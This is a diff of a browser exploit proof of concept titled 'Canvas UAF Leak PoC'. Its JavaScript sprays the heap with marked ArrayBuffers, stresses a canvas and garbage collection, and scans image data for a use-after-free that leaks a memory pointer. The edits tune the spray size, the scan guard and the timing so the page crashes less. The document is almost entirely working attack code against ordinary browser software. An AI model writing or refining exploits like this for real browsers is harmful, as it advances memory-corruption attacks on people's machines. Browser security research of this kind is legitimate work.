@@ -32,7 +32,7 @@
 </head>
 <body>
     <h1>Canvas UAF Leak PoC</h1>
-    <p>Click to test UAF and leak address. Reduced crash risk.</p>
+    <p>Click to test UAF and leak address. Crash risk minimized.</p>
     <button id="trigger">TEST UAF</button>
     <div id="status">Idle...</div>
     <div id="console"></div>
@@ -43,7 +43,7 @@
         const status = document.getElementById('status');
         const consoleDiv = document.getElementById('console');
         let attemptCount = 0;
-        const imageDataSize = 512 * 512 * 4; // 1MB
+        const imageDataSize = 512 * 512 * 2; // 512KB
 
         function log(msg) {
             consoleDiv.append(msg + '\n');
@@ -74,7 +74,7 @@
 
         function sprayHeap() {
             const arrays = [];
-            for (let i = 0; i < 1000; i++) { // Reduced from 5000
+            for (let i = 0; i < 500; i++) { // Reduced from 1000
                 const buf = new ArrayBuffer(imageDataSize);
                 const view = new DataView(buf);
                 for (let j = 0; j < buf.byteLength; j += 16) {
@@ -128,28 +128,30 @@
                     ranges.push(currentRange);
                 }
 
-                // Check for sprayed pattern
+                // Check for sprayed pattern (only if no errors)
                 let leak = null;
-                try {
-                    const currentView = new DataView(current.buffer);
-                    for (let i = 0; i < Math.min(current.buffer.byteLength - 16, 4096); i += 4) {
-                        if (currentView.getUint32(i, true) === 0x41424344) {
-                            const lo = currentView.getUint32(i + 4, true);
-                            const hi = currentView.getUint32(i + 8, true);
-                            const idx = currentView.getUint32(i + 12, true);
-                            if (lo !== 0x12345678 || hi !== 0x87654321) {
-                                leak = {
-                                    offset: i,
-                                    pattern: 'ABCD',
-                                    ptr: `0x${hi.toString(16).padStart(8, '0')}${lo.toString(16).padStart(8, '0')}`,
-                                    index: idx
-                                };
-                                break;
+                if (differenceCount > 0) {
+                    try {
+                        const currentView = new DataView(current.buffer);
+                        for (let i = 0; i < Math.min(current.buffer.byteLength - 16, 2048); i += 4) {
+                            if (currentView.getUint32(i, true) === 0x41424344) {
+                                const lo = currentView.getUint32(i + 4, true);
+                                const hi = currentView.getUint32(i + 8, true);
+                                const idx = currentView.getUint32(i + 12, true);
+                                if (lo !== 0x12345678 || hi !== 0x87654321) {
+                                    leak = {
+                                        offset: i,
+                                        pattern: 'ABCD',
+                                        ptr: `0x${hi.toString(16).padStart(8, '0')}${lo.toString(16).padStart(8, '0')}`,
+                                        index: idx
+                                    };
+                                    break;
+                                }
                             }
                         }
+                    } catch (e) {
+                        return { detected: true, differenceCount, ranges, error: `Leak check error: ${e.message}` };
                     }
-                } catch (e) {
-                    return { detected: true, differenceCount, ranges, error: `Leak check error: ${e.message}` };
                 }
 
                 return { detected: differenceCount > 0, differenceCount, ranges, leak };
@@ -172,11 +174,11 @@
                 }
 
                 // Spray heap
-                log('Spraying heap with 1000 buffers...');
+                log('Spraying heap with 500 buffers...');
                 const sprayed = sprayHeap();
 
                 // Intensive drawing
-                const drawInterval = setInterval(drawOnCanvas, 1); // Restored
+                const drawInterval = setInterval(drawOnCanvas, 1);
 
                 // Check for UAF
                 setTimeout(async () => {
@@ -206,8 +208,8 @@
                                 log(`Buffer index: ${result.leak.index}`);
                             }
                         } else {
-                            status.textContent += '\nUAF occurred, no bytes checked';
-                            log('UAF occurred, no bytes checked');
+                            status.textContent += `\nUAF occurred, no bytes checked`;
+                            log(`UAF occurred, no bytes checked`);
                         }
                     } else {
                         stressGC();
@@ -236,15 +238,15 @@
                                     log(`Buffer index: ${secondResult.leak.index}`);
                                 }
                             } else {
-                                status.textContent += '\nUAF occurred, no bytes checked';
-                                log('UAF occurred, no bytes checked');
+                                status.textContent += `\nUAF occurred, no bytes checked`;
+                                log(`UAF occurred, no bytes checked`);
                             }
                         } else {
                             status.textContent = 'No UAF detected';
                             log('No UAF detected');
                         }
                     }
-                }, 300); // Increased timeout
+                }, 400); // Increased timeout
             } catch (err) {
                 status.textContent = `Failed: ${err.message}`;
                 log(`Error: ${err.message}`);
